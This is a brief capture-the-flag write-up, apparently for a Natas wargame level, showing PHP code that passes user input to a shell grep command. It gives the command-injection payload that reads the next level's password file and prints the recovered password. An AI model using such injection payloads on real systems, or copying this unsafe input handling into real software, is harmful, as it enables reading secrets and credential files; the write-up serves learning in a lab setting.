@@ -1,0 +1,25 @@
+This level was really hard for me, i did a lot of research about how to bypass this code:
+
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+
+The inyection point is at passthru("grep -i   -> $key <- ..). I tried lots of things but gave up the day after.
+So the payload was as simple as this (i was frustrated once i saw the solution):
+	-> .* /etc/natas_webpass/natas10 #
+
+Its trying to grep everithing on the directory along with the route where the password is and # to ignore the "dictionary.txt"); section of the code.
+
+	->Password:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
